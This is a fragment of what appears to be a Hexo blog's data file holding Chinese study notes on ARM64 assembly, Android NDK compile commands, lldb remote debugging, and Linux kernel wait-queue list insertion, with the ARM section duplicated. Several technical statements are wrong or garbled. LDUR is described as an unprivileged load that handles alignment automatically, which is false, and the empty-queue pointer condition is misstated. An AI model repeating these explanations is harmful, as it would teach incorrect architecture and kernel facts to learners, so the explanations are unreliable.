  条件操作：\n    跳转指令：\n    独占访存指令：\n    内存屏障指令：\n    异常处理指令：\n    系统寄存器访问指令：\n</code></pre>\n<h2 id=\"二、ARM-直接编译-s-文件\"><a href=\"#二、ARM-直接编译-s-文件\" class=\"headerlink\" title=\"二、ARM 直接编译.s 文件\"></a>二、ARM 直接编译.s 文件</h2><p>cd /Users/nuoen/Library/Android/sdk/ndk/25.2.9519653/toolchains/llvm/prebuilt/<br>目录更新：<br>/Users/nuoen/Library/Android/sdk/ndk/27.0.12077973/toolchains/llvm/prebuilt/darwin-x86_64/bin</p>\n<p>直接编译.s 文件，/Users/nuoen/Documents/AndroidSecurity/fridaScript/arm64.s<br>android 8.1 :</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">./clang -target aarch64-linux-android26 -v  ~/Documents/AndroidSecurity/fridaScript/arm64.s -o ~/Documents/AndroidSecurity/fridaScript/arm64android --static -ffunction-sections -fdata-sections -Wl,--gc-sections </span><br></pre></td></tr></table></figure>\n<p>android 13 :</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">./clang -target aarch64-linux-android31 -v  ~/Documents/AndroidSecurity/fridaScript/arm64.s -o ~/Documents/AndroidSecurity/fridaScript/arm64android --static</span><br></pre></td></tr></table></figure>\n<p>其中：<br>–static 主要解决 : ld: error: relocation R_AARCH64_ABS64 cannot be used against local symbol; recompile with -fPIC<br>-ffunction-sections -fdata-sections -Wl,–gc-sections 主要解决:<br>executable’s TLS segment is underaligned: alignment is 8, needs to be at least 64 for ARM64 Bionic<br><a href=\"https://github.com/termux/termux-packages/issues/8273\">https://github.com/termux/termux-packages/issues/8273</a></p>\n<p>直接编译.cpp 文件 为可执行文件<br>./clang++  -target aarch64-linux-android32   ~/Documents/AndroidSecurity/fridaScript/cppLearn/cpptest.cpp  -o ~/Documents/AndroidSecurity/fridaScript/cppLearn/cpptest</p>\n<p>编译.cpp 文件为 .s文件<br>./clang++  -target aarch64-linux-android32  -S  ~/Documents/AndroidSecurity/fridaScript/cppLearn/cpptest.cpp  -o ~/Documents/AndroidSecurity/fridaScript/cppLearn/cpptest.s<br>利用lldb远程调试<br>手机端：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">./lldb-server p --server --listen unix-abstract:///data/local/tmp/debug.sock</span><br></pre></td></tr></table></figure>\n<p>调试端：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ lldb-&lt;version&gt;</span><br><span class=\"line\">$ platform list  # 查看lldb可以连接的平台</span><br><span class=\"line\">$ platform select remote-android</span><br><span class=\"line\">$ platform status # 查看平台状态</span><br><span class=\"line\">$ platform connect unix-abstract-connect:///data/local/tmp/debug.sock</span><br></pre></td></tr></table></figure>\n</details>\n\n<p>A64的存储和加载指令<br>ldr和str指令<br>ARMv8也是基于指令加载和存储的架构，即不能直接操作内存</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">LDR &lt;reg_dst&gt;,&lt;addr&gt; //把存储器地址的数据加载到目的寄存器中</span><br><span class=\"line\">STR &lt;reg_src&gt;,&lt;addr&gt; //把原寄存器的值，存储到内存中</span><br></pre></td></tr></table></figure>\n<p>ld指令寻址1：地址偏移模式</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ldr Xd,[Xn,$offset]</span><br></pre></td></tr></table></figure>\n\n\n<p>std:string内存结构</p>\n","site":{"data":{}},"cover":false,"excerpt":"","more":"<h3 id=\"CPSR\"><a href=\"#CPSR\" class=\"headerlink\" title=\"CPSR\"></a>CPSR</h3><p>实现金丝雀机制，防止栈溢出<br>libnativelib.so:0000007E929D3B90 MRS             X8, #3, c13, c0, #2<br>libnativelib.so:0000007E929D3B94 LDR             X8, [X8,#0x28]<br>libnativelib.so:0000007E929D3B98 STUR            X8, [X29,#var_8]</p>\n<p>libnativelib.so:0000007E929D3CBC MRS             X8, #3, c13, c0, #2<br>libnativelib.so:0000007E929D3CC0 LDR             X8, [X8,#0x28]<br>libnativelib.so:0000007E929D3CC4 LDUR            X9, [X29,#var_8]<br>libnativelib.so:0000007E929D3CC8 SUBS            X8, X8, X9<br>libnativelib.so:0000007E929D3CCC B.NE            loc_7E929D3CE0</p>\n<p>//<a href=\"https://cataloc.gitee.io/blog/2021/04/24/Android%E9%80%86%E5%90%91%E4%B8%AD%E7%9A%84Canary%E6%9C%BA%E5%88%B6/\">https://cataloc.gitee.io/blog/2021/04/24/Android%E9%80%86%E5%90%91%E4%B8%AD%E7%9A%84Canary%E6%9C%BA%E5%88%B6/</a></p>\n<h3 id=\"LDR\"><a href=\"#LDR\" class=\"headerlink\" title=\"LDR\"></a>LDR</h3><p><code>LDR</code> 和 <code>LDUR</code> 都是ARM汇编中用于加载（Load）数据的指令，但它们有一些重要的区别：</p>\n<ol>\n<li><p>LDR（Load Register）：</p>\n<ul>\n<li><code>LDR</code> 指令用于从内存中加载数据，并将其存储到通用寄存器中。</li>\n<li><code>LDR</code> 指令可以加载各种数据类型，包括字节、半字、字、双字以及浮点数等。</li>\n<li><code>LDR</code> 指令执行标准的内存访问，根据所加载数据的大小，可能会引发数据对齐异常（例如，尝试加载未对齐的数据）。</li>\n<li><code>LDR</code> 指令通常用于访问常规内存，如堆、栈或全局数据。</li>\n</ul>\n</li>\n<li><p>LDUR（Load Register Unprivileged）：</p>\n<ul>\n<li><code>LDUR</code> 指令是ARM64架构引入的一种指令，用于无权限加载数据，它通常在用户模式下使用。</li>\n<li><code>LDUR</code> 指令具有无权限访问内存的特性，因此即使在特权级别较低（如用户模式）也可以使用。</li>\n<li><code>LDUR</code> 指令在加载数据时会自动处理数据对齐，不会引发数据对齐异常，这是 <code>LDUR</code> 与 <code>LDR</code> 的一个重要区别。</li>\n<li><code>LDUR</code> 指令也可以加载各种数据类型，但它在无权限访问的情况下更有用。</li>\n</ul>\n</li>\n</ol>\n<p>总结来说，主要区别在于权限和数据对齐处理：</p>\n<ul>\n<li><code>LDR</code> 是标准的加载指令，用于加载数据到通用寄存器，通常在特权级别较高的情况下使用。</li>\n<li><code>LDUR</code> 是一种无权限加载指令，它可以在用户模式下使用，且具有自动数据对齐的功能，因此更适合无权限访问的情况。</li>\n</ul>\n<p>选择使用哪个指令取决于特定的应用场景和访问内存的权限要求。</p>\n<p><code>LDRB</code> 是ARM汇编中的指令，用于从内存中加载一个字节（8位数据）并将其存储到通用寄存器中。<code>LDRB</code> 的名称表示 “Load Byte”，它执行以下操作：</p>\n<ol>\n<li>从指定的内存地址读取一个字节的数据。</li>\n<li>将读取的字节数据零扩展到32位，然后将其存储在目标通用寄存器中。</li>\n</ol>\n<p><code>LDRB</code> 指令的通用格式如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">LDRB Rd, [Rn, #offset]</span><br></pre></td></tr></table></figure>\n\n<p>其中：</p>\n<ul>\n<li><code>Rd</code> 是目标通用寄存器，用于存储加载的字节数据。</li>\n<li><code>Rn</code> 是基址寄存器，包含了内存地址的基址。</li>\n<li><code>offset</code> 是一个偏移量，指定要加载的内存地址相对于基址寄存器 <code>Rn</code> 的偏移。</li>\n</ul>\n<p>举个例子，如果要从内存地址 <code>R0 + 8</code> 处加载一个字节，然后将其存储到通用寄存器 <code>R1</code> 中，可以使用以下指令：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">LDRB R1, [R0, #8]</span><br></pre></td></tr></table></figure>\n\n<p>这条指令将加载地址为 <code>R0 + 8</code> 处的一个字节，将其零扩展为32位，然后将其存储在 <code>R1</code> 寄存器中。<code>LDRB</code> 通常用于加载单个字节的数据，例如字符或字节型的数据。</p>\n<h3 id=\"MRS\"><a href=\"#MRS\" class=\"headerlink\" title=\"MRS\"></a>MRS</h3><h1 id=\"ARM64-学习：\"><a href=\"#ARM64-学习：\" class=\"headerlink\" title=\"ARM64 学习：\"></a>ARM64 学习：</h1><h2 id=\"一、基础知识\"><a href=\"#一、基础知识\" class=\"headerlink\" title=\"一、基础知识\"></a>一、基础知识</h2><h3 id=\"1-ARMv8特色：\"><a href=\"#1-ARMv8特色：\" class=\"headerlink\" title=\"1.ARMv8特色：\"></a>1.ARMv8特色：</h3><pre><code>* (1) 超大的物理地址空间(Large Physical Address)，提供超过4GB物理内存的访问；\n    (2) 64位宽的虚拟地址空间(64-bit Virtual Addresing);\n    (3) 提供31个64位宽的通用寄存器，可以减少对栈的访问，从而提高性能；\n    (4) 提供16KB和64KB的页面，有助于降低TLB的未命中率(miss rate);\n    (5) 全新的异常处理模型，有助于降低操作系统和虚拟化的实现复杂度；\n    (6)全新的加载-获取，存储-释放指令(Load-Acquire, Store-Release Instructions)。专门为C++11，C11以及Java内存模型设计；\n\n2 执行状态\n    AArch64: 64位的执行状态：\n    (1) 提供31个64位通用寄存器；\n    (2) 提供64位的程序计数器寄存器PC、栈指针寄存器SP以及异常链接寄存器；\n    (3) 提供A64指令集；\n    (4)定义ARMv8异常模型，支持4个异常等级，EL0~EL3;\n    (5)提供64位的内存模型；\n    (6)定义一组处理器状态(PSTATE)用来保存PE的状态；\n    AArch32: 32位的执行状态：\n    (1) 提供13个632位通用寄存器, 32位的程序计数寄存器PC、栈指针寄存器SP、链接寄存器；\n    (2) 提供A32,T32指令集；\n    (3)定义ARMv7异常模型，基于PE模式并映射到ARMv8的异常模型中；\n    (4)提供32位虚拟内存访问机制；\n    (5)定义一组处理器状态(PSTATE)用来保存PE的状态；\n\n3 ARMv8包含的寄存器\n    3.1 ARMv8包含31个通用寄存器\n        AArch64运行状态支持31个通用寄存器X0~X30，AArch32状态支持16个32位通用寄存器；\n        X0~X30：通用寄存器；\n        SP: 栈指针寄存器；\n        PC：程序计数寄存器；\n        其中：x30寄存器（lr寄存器）\n            x30寄存器是链接寄存器，用于保存函数的返回地址，当ret指令执行时，会寻找x30寄存器中的值，作为返回地址；\n            x29寄存器是fp寄存器，用于保存函数的栈帧指针，指向函数的栈帧起始地址，即栈底地址；\n\n    3.2 系统寄存器\n        系统寄存器提供控制和状态，在AArch64状态下，很多系统寄存器根据不同的异常等级提供不同的变种寄存器：\n        &lt;reg_name&gt;_ELx, x is 0,1,2, or 3\n        比如SP_EL0表示在EL0下的栈指针寄存器；\n\n    3.3 SIMD/FP寄存器：\n        支持128bit寄存器\n\n    3.4 特殊寄存器\n        XZE\n\n4.数据类型\n    Byte: 8bit\n    Halfword: 16bit\n    Word: 32bit\n    Doubleworld: 64bit\n    Quadword: 128bit\n\n5.异常模型\n    Exception Levels确定了处理器当前运行的特权级别，类似ARMv7架构中的特权等级\n    EL0: 用户特权，用于运行普通应用程序；\n    EL1: 系统特权，通常用于运行操作系统；\n    EL2: 运行虚拟化扩展的虚拟监控程序(Hypervisor);\n    EL3: 运行安全世界中的安全监控器(Secure Monitor);\n    异常级别    应用场景    安全世界\n    EL0    APP    Secure OS\n    EL1    Guest OS    sECURE OS\n    EL2    Hypervisor    Secure Hypervisor\n    EL3    Secure—&gt;    –&gt;monitor\n\n6.A64汇编指令介绍：\n    1.A64指令集只能运行在aarch64环境中；\n    2.所有的A64汇编指令都是32bit宽；\n    3.A64支持全部大写或小写书写方式；\n    4.寄存器命名,\n    Name    size    Encoding    Descriptio\n    Wn    32bits    0~30    General-purpose register0~30\n    Xn    64bit    0~30    General-purpose register0~30\n    WZR    32bits    31    Zero register\n    XZR    64bit    31    Zero register\n    WSP    32bits    31    Current stack pointer\n    SP    64bit    31    Current stack pointer\n\n7.A64指令分类\n    内存加载和存储指令：\n    多字节内存加载和存储：\n    算术和移位指令：\n    位操作指令：\n    条件操作：\n    跳转指令：\n    独占访存指令：\n    内存屏障指令：\n    异常处理指令：\n    系统寄存器访问指令：\n</code></pre>\n<h2 id=\"二、ARM-直接编译-s-文件\"><a href=\"#二、ARM-直接编译-s-文件\" class=\"headerlink\" title=\"二、ARM 直接编译.s 文件\"></a>二、ARM 直接编译.s 文件</h2><p>cd /Users/nuoen/Library/Android/sdk/ndk/25.2.9519653/toolchains/llvm/prebuilt/<br>目录更新：<br>/Users/nuoen/Library/Android/sdk/ndk/27.0.12077973/toolchains/llvm/prebuilt/darwin-x86_64/bin</p>\n<p>直接编译.s 文件，/Users/nuoen/Documents/AndroidSecurity/fridaScript/arm64.s<br>android 8.1 :</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">./clang -target aarch64-linux-android26 -v  ~/Documents/AndroidSecurity/fridaScript/arm64.s -o ~/Documents/AndroidSecurity/fridaScript/arm64android --static -ffunction-sections -fdata-sections -Wl,--gc-sections </span><br></pre></td></tr></table></figure>\n<p>android 13 :</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">./clang -target aarch64-linux-android31 -v  ~/Documents/AndroidSecurity/fridaScript/arm64.s -o ~/Documents/AndroidSecurity/fridaScript/arm64android --static</span><br></pre></td></tr></table></figure>\n<p>其中：<br>–static 主要解决 : ld: error: relocation R_AARCH64_ABS64 cannot be used against local symbol; recompile with -fPIC<br>-ffunction-sections -fdata-sections -Wl,–gc-sections 主要解决:<br>executable’s TLS segment is underaligned: alignment is 8, needs to be at least 64 for ARM64 Bionic<br><a href=\"https://github.com/termux/termux-packages/issues/8273\">https://github.com/termux/termux-packages/issues/8273</a></p>\n<p>直接编译.cpp 文件 为可执行文件<br>./clang++  -target aarch64-linux-android32   ~/Documents/AndroidSecurity/fridaScript/cppLearn/cpptest.cpp  -o ~/Documents/AndroidSecurity/fridaScript/cppLearn/cpptest</p>\n<p>编译.cpp 文件为 .s文件<br>./clang++  -target aarch64-linux-android32  -S  ~/Documents/AndroidSecurity/fridaScript/cppLearn/cpptest.cpp  -o ~/Documents/AndroidSecurity/fridaScript/cppLearn/cpptest.s<br>利用lldb远程调试<br>手机端：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">./lldb-server p --server --listen unix-abstract:///data/local/tmp/debug.sock</span><br></pre></td></tr></table></figure>\n<p>调试端：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ lldb-&lt;version&gt;</span><br><span class=\"line\">$ platform list  # 查看lldb可以连接的平台</span><br><span class=\"line\">$ platform select remote-android</span><br><span class=\"line\">$ platform status # 查看平台状态</span><br><span class=\"line\">$ platform connect unix-abstract-connect:///data/local/tmp/debug.sock</span><br></pre></td></tr></table></figure>\n</details>\n\n<p>A64的存储和加载指令<br>ldr和str指令<br>ARMv8也是基于指令加载和存储的架构，即不能直接操作内存</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">LDR &lt;reg_dst&gt;,&lt;addr&gt; //把存储器地址的数据加载到目的寄存器中</span><br><span class=\"line\">STR &lt;reg_src&gt;,&lt;addr&gt; //把原寄存器的值，存储到内存中</span><br></pre></td></tr></table></figure>\n<p>ld指令寻址1：地址偏移模式</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ldr Xd,[Xn,$offset]</span><br></pre></td></tr></table></figure>\n\n\n<p>std:string内存结构</p>\n"},{"_content":"## 等待队列核心结构体\ninclude/linux/wait.h\n```c\n/*\n * A single wait-queue entry structure:\n */\nstruct wait_queue_entry {\n\tunsigned int\t\tflags;\n\tvoid\t\t\t*private;\n\twait_queue_func_t\tfunc; // 回调函数，用于唤醒等待队列中的进程\n\tstruct list_head\tentry;\n};\n\nstruct wait_queue_head {\n\tspinlock_t\t\tlock;\n\tstruct list_head\thead;\n};\n\n```\ninclude/linux/types.h\n```c\nstruct list_head {\n\tstruct list_head *next, *prev;\n};\n```\n## __add_wait_queue_entry_tail 剖析\n__add_wait_queue_entry_tail 只是把一个新的 wait_queue_entry 节点插到等待队列链表的“尾部”（即链表头部哨兵节点之前）。它的调用链和指针更新流程大致如下：\n1. 调用点\n```c\nstatic inline void __add_wait_queue_entry_tail(\n    struct wait_queue_head *wq_head,\n    struct wait_queue_entry *wq_entry)\n{\n    list_add_tail(&wq_entry->entry, &wq_head->head);\n}\n```\n* wq_head->head 是链表的哨兵节点（head），永远存在，不保存实际数据。\n* wq_entry->entry 是要插入的节点的 list_head。\n\n2.list_add_tail\n```c\nstatic inline void list_add_tail(struct list_head *new,\n                                 struct list_head *head)\n{\n    __list_add(new, head->prev, head);\n}\n```\n* head->prev：指向当前链表的最后一个真正的数据节点（如果链表为空，则 head->prev == head）。\n* 这里把新节点插到 (prev, head) 这两个节点之间。\n\n3.\t__list_add 的四步指针更新\n```c\nstatic inline void __list_add(struct list_head *new,\n                              struct list_head *prev,\n                              struct list_head *next)\n{\n    if (!__list_add_valid(new, prev, next))\n        return;\n\n    next->prev    = new;        // 1. 哨兵(或 next) 的 prev 指向 new\n    new->next     = next;       // 2. new 的 next 指向 哨兵(或 next)\n    new->prev     = prev;       // 3. new 的 prev 指向 原来的最后一个节点 prev\n    WRITE_ONCE(prev->next, new);// 4. prev 的 next 原子地指向 new\n}\n```\n这四步顺序非常重要，确保链表在任意时刻都保持可遍历性：\n```\nbefore insertion:          after insertion:\n\n   prev ↔ next                  prev ↔ new ↔ next\n    │       │                   │       │       │\n    └──…───┘                   └──…───┘       └──…───┘\n```\n*\t步骤 1：让 next->prev = new，先把原来指向 prev 的反向指针指向新节点。\n*\t步骤 2：让 new->next = next，把新节点的“下一个”指向 next。\n*\t步骤 3：让 new->prev = prev，把新节点的“上一个”指向原来的 prev。\n*\t步骤 4：最后把 prev->next（原来指向 next）改成指向 new。\n4. “尾部”插入的效果\n如果队列原来是空的,则：\n```c\nhead.next == new && head.prev == head\n```\n插入后，head.next、head.prev 都会被更新成指向 new，形成一个单节点循环链表。\n* 如果队列不空，则把 new 串到末尾，更新前一个末尾节点的 next 和 head->prev。\n• __add_wait_queue_entry_tail → list_add_tail → __list_add\n• 本质上是一个带哨兵节点的双向循环链表，尾部插入就是把新节点放在哨兵之前。\n• 指针更新分四步，保证中途链表始终有效。\n• WRITE_ONCE 用来避免编译器或 CPU reorder，对并发场景更安全。\n\n通过list_head地址获取整体的结构体\ninclude/linux/list.h\n```c\n/**\n * list_entry - get the struct for this entry\n * @ptr:\tthe &struct list_head pointer.\n * @type:\tthe type of the struct this is embedded in.\n * @member:\tthe name of the list_head within the struct.\n */\n#define list_entry(ptr, type, member) \\\n\tcontainer_of(ptr, type, member)\n```","source":"_drafts/内核等待队列.md","raw":"## 等待队列核心结构体\ninclude/linux/wait.h\n```c\n/*\n * A single wait-queue entry structure:\n */\nstruct wait_queue_entry {\n\tunsigned int\t\tflags;\n\tvoid\t\t\t*private;\n\twait_queue_func_t\tfunc; // 回调函数，用于唤醒等待队列中的进程\n\tstruct list_head\tentry;\n};\n\nstruct wait_queue_head {\n\tspinlock_t\t\tlock;\n\tstruct list_head\thead;\n};\n\n```\ninclude/linux/types.h\n```c\nstruct list_head {\n\tstruct list_head *next, *prev;\n};\n```\n## __add_wait_queue_entry_tail 剖析\n__add_wait_queue_entry_tail 只是把一个新的 wait_queue_entry 节点插到等待队列链表的“尾部”（即链表头部哨兵节点之前）。它的调用链和指针更新流程大致如下：\n1. 调用点\n```c\nstatic inline void __add_wait_queue_entry_tail(\n    struct wait_queue_head *wq_head,\n    struct wait_queue_entry *wq_entry)\n{\n    list_add_tail(&wq_entry->entry, &wq_head->head);\n}\n```\n* wq_head->head 是链表的哨兵节点（head），永远存在，不保存实际数据。\n* wq_entry->entry 是要插入的节点的 list_head。\n\n2.list_add_tail\n```c\nstatic inline void list_add_tail(struct list_head *new,\n                                 struct list_head *head)\n{\n    __list_add(new, head->prev, head);\n}\n```\n* head->prev：指向当前链表的最后一个真正的数据节点（如果链表为空，则 head->prev == head）。\n* 这里把新节点插到 (prev, head) 这两个节点之间。\n\n3.\t__list_add 的四步指针更新\n```c\nstatic inline void __list_add(struct list_head *new,\n                              struct list_head *prev,\n                              struct list_head *next)\n{\n    if (!__list_add_valid(new, prev, next))\n        return;\n\n    next->prev    = new;        // 1. 哨兵(或 next) 的 prev 指向 new\n    new->next     = next;       // 2. new 的 next 指向 哨兵(或 next)\n    new->prev     = prev;       // 3. new 的 prev 指向 原来的最后一个节点 prev\n    WRITE_ONCE(prev->next, new);// 4. prev 的 next 原子地指向 new\n}\n```\n这四步顺序非常重要，确保链表在任意时刻都保持可遍历性：\n```\nbefore insertion:          after insertion:\n\n   prev ↔ next                  prev ↔ new ↔ next\n    │       │                   │       │       │\n    └──…───┘                   └──…───┘       └──…───┘\n```\n*\t步骤 1：让 next->prev = new，先把原来指向 prev 的反向指针指向新节点。\n*\t步骤 2：让 new->next = next，把新节点的“下一个”指向 next。\n*\t步骤 3：让 new->prev = prev，把新节点的“上一个”指向原来的 prev。\n*\t步骤 4：最后把 prev->next（原来指向 next）改成指向 new。\n4. “尾部”插入的效果\n如果队列原来是空的,则：\n```c\nhead.next == new && head.prev == head\n```\n插入后，head.next、head.prev 都会被更新成指向 new，形成一个单节点循环链表。\n* 如果队列不空，则把 new 串到末尾，更新前一个末尾节点的 next 和 head->prev。\n• __add_wait_queue_entry_tail → list_add_tail → __list_add\n• 本质上是一个带哨兵节点的双向循环链表，尾部插入就是把新节点放在哨兵之前。\n• 指针更新分四步，保证中途链表始终有效。\n• WRITE_ONCE 用来避免编译器或 CPU reorder，对并发场景更安全。\n\n通过list_head地址获取整体的结构体\ninclude/linux/list.h\n```c\n/**\n * list_entry - get the struct for this entry\n * @ptr:\tthe &struct list_head pointer.\n * @type:\tthe type of the struct this is embedded in.\n * @member:\tthe name of the list_head within the struct.\n */\n#define list_entry(ptr, type, member) \\\n\tcontainer_of(ptr, type, member)\n```","slug":"内核等待队列","published":0,"date":"2025-06-08T09:29:32.833Z","updated":"2025-06-08T10:05:39.058Z","title":"","comments":1,"layout":"post","photos":[],"link":"","_id":"cmd44rit1000ov8fyflzad6tq","content":"<h2 id=\"等待队列核心结构体\"><a href=\"#等待队列核心结构体\" class=\"headerlink\" title=\"等待队列核心结构体\"></a>等待队列核心结构体</h2><p>include/linux/wait.h</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\"> * A single wait-queue entry structure:</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">wait_queue_entry</span> &#123;</span></span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> <span class=\"type\">int</span>\t\tflags;</span><br><span class=\"line\">\t<span class=\"type\">void</span>\t\t\t*private;</span><br><span class=\"line\">\t<span class=\"type\">wait_queue_func_t</span>\tfunc; <span class=\"comment\">// 回调函数，用于唤醒等待队列中的进程</span></span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">list_head</span>\t<span class=\"title\">entry</span>;</span></span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">wait_queue_head</span> &#123;</span></span><br><span class=\"line\">\t<span class=\"type\">spinlock_t</span>\t\tlock;</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">list_head</span>\t<span class=\"title\">head</span>;</span></span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>include/linux/types.h</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">list_head</span> &#123;</span></span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">list_head</span> *<span class=\"title\">next</span>, *<span class=\"title\">prev</span>;</span></span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<h2 id=\"add-wait-queue-entry-tail-剖析\"><a href=\"#add-wait-queue-entry-tail-剖析\" class=\"headerlink\" title=\"__add_wait_queue_entry_tail 剖析\"></a>__add_wait_queue_entry_tail 剖析</h2><p>__add_wait_queue_entry_tail 只是把一个新的 wait_queue_entry 节点插到等待队列链表的“尾部”（即链表头部哨兵节点之前）。它的调用链和指针更新流程大致如下：</p>\n<ol>\n<li>调用点<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"keyword\">inline</span> <span class=\"type\">void</span> __add_wait_queue_entry_tail(</span><br><span class=\"line\">    <span class=\"keyword\">struct</span> wait_queue_head *wq_head,</span><br><span class=\"line\">    <span class=\"keyword\">struct</span> wait_queue_entry *wq_entry)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    list_add_tail(&amp;wq_entry-&gt;entry, &amp;wq_head-&gt;head);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></li>\n</ol>\n<ul>\n<li>wq_head-&gt;head 是链表的哨兵节点（head），永远存在，不保存实际数据。</li>\n<li>wq_entry-&gt;entry 是要插入的节点的 list_head。</li>\n</ul>\n<p>2.list_add_tail</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"keyword\">inline</span> <span class=\"type\">void</span> <span class=\"title function_\">list_add_tail</span><span class=\"params\">(<span class=\"keyword\">struct</span> list_head *new,</span></span><br><span class=\"line\"><span class=\"params\">                                 <span class=\"keyword\">struct</span> list_head *head)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    __list_add(new, head-&gt;prev, head);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>head-&gt;prev：指向当前链表的最后一个真正的数据节点（如果链表为空，则 head-&gt;prev == head）。</li>\n<li>这里把新节点插到 (prev, head) 这两个节点之间。</li>\n</ul>\n<ol start=\"3\">\n<li>   __list_add 的四步指针更新<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"keyword\">inline</span> <span class=\"type\">void</span> __list_add(<span class=\"keyword\">struct</span> list_head *new,</span><br><span class=\"line\">                              <span class=\"keyword\">struct</span> list_head *prev,</span><br><span class=\"line\">                              <span class=\"keyword\">struct</span> list_head *next)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!__list_add_valid(new, prev, next))</span><br><span class=\"line\">        <span class=\"keyword\">return</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    next-&gt;prev    = new;        <span class=\"comment\">// 1. 哨兵(或 next) 的 prev 指向 new</span></span><br><span class=\"line\">    new-&gt;next     = next;       <span class=\"comment\">// 2. new 的 next 指向 哨兵(或 next)</span></span><br><span class=\"line\">    new-&gt;prev     = prev;       <span class=\"comment\">// 3. new 的 prev 指向 原来的最后一个节点 prev</span></span><br><span class=\"line\">    WRITE_ONCE(prev-&gt;next, new);<span class=\"comment\">// 4. prev 的 next 原子地指向 new</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n这四步顺序非常重要，确保链表在任意时刻都保持可遍历性：<figure 